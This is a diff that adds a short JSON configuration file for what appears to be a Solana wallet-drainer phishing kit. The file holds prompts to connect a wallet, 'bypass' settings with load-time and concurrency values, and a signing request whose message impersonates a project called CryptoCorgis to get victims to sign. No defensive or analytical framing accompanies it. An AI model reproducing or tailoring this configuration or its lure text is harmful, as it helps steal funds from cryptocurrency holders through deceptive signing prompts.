@@ -1,0 +1,21 @@
+{
+    "texts": [
+        "Invalid Wallet",
+        "Wallet has no funds to pay the transaction Fees.",
+        "Connect Solana Wallet",
+        "{addyfirst4}...{addylast4}",
+        "Loading Please, wait..."
+    ],
+    "bypass": false,
+    "modal": 3,
+    "bypassv2": {
+        "enabled": true,
+        "loadTime": 5,
+        "concurrent": 15
+    },
+    "seeds": {
+        "askForConnecting": true,
+        "signMessage": "To avoid digital dognappers, sign below to authenticate with CryptoCorgis",
+        "enableSign": true
+    }
+}
